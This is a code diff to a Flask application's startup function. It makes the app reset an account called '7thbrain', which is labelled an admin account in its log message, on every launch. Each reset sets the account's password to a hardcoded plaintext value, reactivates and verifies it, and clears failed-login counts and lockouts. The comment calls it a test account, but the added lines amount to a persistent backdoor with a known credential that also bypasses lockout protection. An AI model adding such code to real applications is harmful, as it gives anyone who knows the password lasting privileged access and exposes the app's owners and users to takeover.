@@ -251,9 +251,11 @@ def _create_flask_app():
                     db.session.commit()
                 else:
                     _u = User.query.filter_by(username="7thbrain").first()
-                    if _u.status != "active":
-                        _u.status = "active"; _u.is_active = True; _u.is_verified = True
-                        db.session.commit()
+                    # Always reset password and status so test account is always functional
+                    _u.set_password("Mayflower1!")
+                    _u.status = "active"; _u.is_active = True; _u.is_verified = True
+                    _u.failed_login_attempts = 0; _u.account_locked_until = None
+                    db.session.commit()
             except Exception as _e:
                 logger.warning(f"7thbrain admin: {_e}")
             try:
